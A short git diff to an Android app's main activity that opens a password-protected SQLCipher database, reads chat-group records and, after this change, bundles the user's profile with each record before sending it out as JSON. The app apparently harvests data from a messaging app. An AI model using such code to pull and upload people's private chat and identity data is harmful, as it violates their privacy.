@@ -13,11 +13,14 @@ import android.widget.TextView;
 
 import com.google.gson.Gson;
 import com.wiwj.wxrecord.domain.Qun;
+import com.wiwj.wxrecord.domain.UserInfo;
 
 import net.sqlcipher.database.SQLiteDatabase;
 
 import java.io.File;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
     private TextView textView;
@@ -54,6 +57,7 @@ public class MainActivity extends AppCompatActivity {
 
     /**
      * 发送全部群存在的信息
+     *
      * @param password
      */
     private void handle(String password) {
@@ -68,9 +72,13 @@ public class MainActivity extends AppCompatActivity {
                 db = DataQuery.getdb(file, password);
                 //查询量多的话最好做条件查询
                 List<Qun> qunList = DataQuery.getResult(db);
+                UserInfo userInfo = DataQuery.getUserInfo(db);
                 Gson gson = new Gson();
                 for (Qun qun : qunList) {
-                    String res = gson.toJson(qun);
+                    Map<String, Object> data = new HashMap<String, Object>();
+                    data.put("userInfo", userInfo);
+                    data.put("qun", qun);
+                    String res = gson.toJson(data);
                     LogUtil.d("发送的json数据为：" + res);
                     //发送数据
                     SendDataUtils.sendData(res);
